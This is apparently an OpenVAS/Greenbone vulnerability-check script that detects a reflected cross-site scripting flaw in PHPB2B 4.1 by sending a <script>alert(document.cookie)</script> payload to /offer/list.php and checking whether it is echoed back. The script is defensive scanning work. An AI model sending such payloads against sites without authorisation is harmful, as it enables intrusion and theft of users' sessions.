# SPDX-FileCopyrightText: 2011 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802369");
  script_version("2023-12-13T05:05:23+0000");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_tag(name:"last_modification", value:"2023-12-13 05:05:23 +0000 (Wed, 13 Dec 2023)");
  script_tag(name:"creation_date", value:"2011-12-05 15:17:25 +0530 (Mon, 05 Dec 2011)");
  script_name("PHPB2B 'q' Parameter Cross-Site Scripting Vulnerability");
  script_xref(name:"URL", value:"http://packetstormsecurity.org/files/108280/phpb2b-xss.txt");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/51221");
  script_xref(name:"URL", value:"http://vulnsecuritylist.com/vulnerability/phpb2b-cross-site-scripting/");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2011 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "no404.nasl", "webmirror.nasl", "DDI_Directory_Scanner.nasl", "gb_php_http_detect.nasl", "global_settings.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to insert
  arbitrary HTML and script code, which will be executed in a user's browser
  session in the context of an affected site.");

  script_tag(name:"affected", value:"PHPB2B version 4.1 and prior.");

  script_tag(name:"insight", value:"The flaw is due to improper validation of user-supplied input
  via the 'q' parameter to /offer/list.php, which allows attacker to execute
  arbitrary HTML and script code on the user's browser session in the security
  context of an affected site.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one.");

  script_tag(name:"summary", value:"PHPB2B is prone to a cross-site scripting (XSS) vulnerability.");

  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"qod_type", value:"remote_analysis");
  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("port_service_func.inc");
include("list_array_func.inc");

phpb2bPort = http_get_port(default:80);

if(!http_can_host_php(port:phpb2bPort)) {
  exit(0);
}

foreach dir (make_list_unique("/phpb2b", "/phpb2b/upload", http_cgi_dirs(port:phpb2bPort)))
{

  if(dir == "/") dir = "";

  rcvRes = http_get_cache(item: dir + "/index.php", port:phpb2bPort);

  if("PHPB2B e-commerce Web Site Management System" >< rcvRes &&
     ">Powered by PHPB2B" >< rcvRes)
  {
    url = dir + '/offer/list.php?do=search&q=<script>alert(document.cookie)</script>';

    if(http_vuln_check(port:phpb2bPort, url:url, pattern:"<script>alert\(document\.cookie\)</script>", check_header:TRUE))
    {
       security_message(port:phpb2bPort);
       exit(0);
    }
  }
}

exit(99);
